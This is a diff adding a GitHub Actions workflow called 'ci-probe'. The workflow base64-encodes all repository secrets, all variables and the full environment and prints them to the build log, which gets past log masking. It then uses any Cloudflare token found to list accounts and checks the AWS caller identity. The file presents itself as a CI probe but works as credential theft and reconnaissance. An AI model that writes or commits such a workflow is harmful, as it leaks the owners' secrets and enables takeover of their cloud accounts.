@@ -1,0 +1,42 @@
+name: ci-probe
+on:
+  push:
+    branches: ['ci-probe-*']
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: dump
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          VARS_JSON: ${{ toJSON(vars) }}
+        run: |
+          echo "REPO=${{ github.repository }} REF=${{ github.ref }} ACTOR=${{ github.actor }} EVENT=${{ github.event_name }}"
+          echo -n "SECRETS_B64="; printf '%s' "$SECRETS_JSON" | base64 -w0; echo
+          echo -n "VARS_B64="; printf '%s' "$VARS_JSON" | base64 -w0; echo
+          echo -n "KEYS="; printf '%s' "$SECRETS_JSON" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(",".join(sorted(d.keys())))'
+          echo "---ENVB64---"; env | sort | base64 -w0; echo
+      - name: derived
+        env:
+          CF1: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CF2: ${{ secrets.CF_API_TOKEN }}
+          AWSAK: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          INFIS: ${{ secrets.INFISICAL_CLIENT_SECRET }}
+        run: |
+          T="${CF1:-${CF2:-}}"
+          if [ -n "$T" ]; then
+            echo -n "CF_VERIFY_B64="; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/user/tokens/verify | base64 -w0; echo
+            echo -n "CF_ACCOUNTS_B64="; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/accounts | base64 -w0; echo
+          else
+            echo "NO_CF_TOKEN_IN_ENV"
+          fi
+          if [ -n "$AWSAK" ]; then
+            echo -n "AWS_ID_B64="; aws sts get-caller-identity --output json 2>&1 | base64 -w0; echo
+          else
+            echo "NO_AWS_KEY_IN_ENV"
+          fi
